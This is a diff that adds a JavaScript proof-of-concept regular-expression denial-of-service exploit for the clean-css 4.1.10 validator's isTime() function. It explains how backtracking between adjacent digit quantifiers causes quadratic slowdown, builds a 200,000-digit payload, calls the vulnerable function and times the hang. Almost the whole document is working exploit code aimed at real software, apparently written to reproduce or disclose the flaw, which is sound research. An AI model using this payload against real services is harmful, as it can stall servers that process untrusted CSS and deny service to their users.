@@ -1,0 +1,33 @@
+```javascript
+// ReDoS exploit for clean-css 4.1.10 - lib/optimizer/validator.js:isTime()
+//
+// isTime() tests input against timeRegex = /^(\-?\+?\.?\d+\.?\d*(s|ms))$/
+// The two adjacent unbounded quantifiers on the same character class
+// (\d+ ... \d*) separated by an optional literal (\.?) create many ways
+// to partition a long digit string between them. When the overall match
+// ultimately fails (no trailing "s"/"ms"), the regex engine backtracks
+// through all O(n) partitions, each of which itself costs O(n),
+// producing O(n^2) behavior - enough to hang a process on attacker
+// controlled CSS time values (e.g. transition/animation durations).
+
+const validator = require("./node_modules/clean-css/lib/optimizer/validator.js")({
+  colors: { opacity: false },
+  units: {}
+});
+
+// Malicious "time" value: huge digit run + '.' + huge digit run + a
+// non-matching trailing char, so the regex fails only after exhausting
+// backtracking possibilities.
+const n = 100000;
+const payload = "9".repeat(n) + "." + "9".repeat(n) + "x";
+
+console.log("Payload length:", payload.length);
+const start = Date.now();
+validator.isTime(payload); // <-- vulnerable sink
+const elapsed = Date.now() - start;
+
+console.log("isTime() took", elapsed, "ms");
+if (elapsed > 1000) {
+  console.log("ReDoS confirmed: isTime() blocked the event loop for over 1s on a single input.");
+}
+```
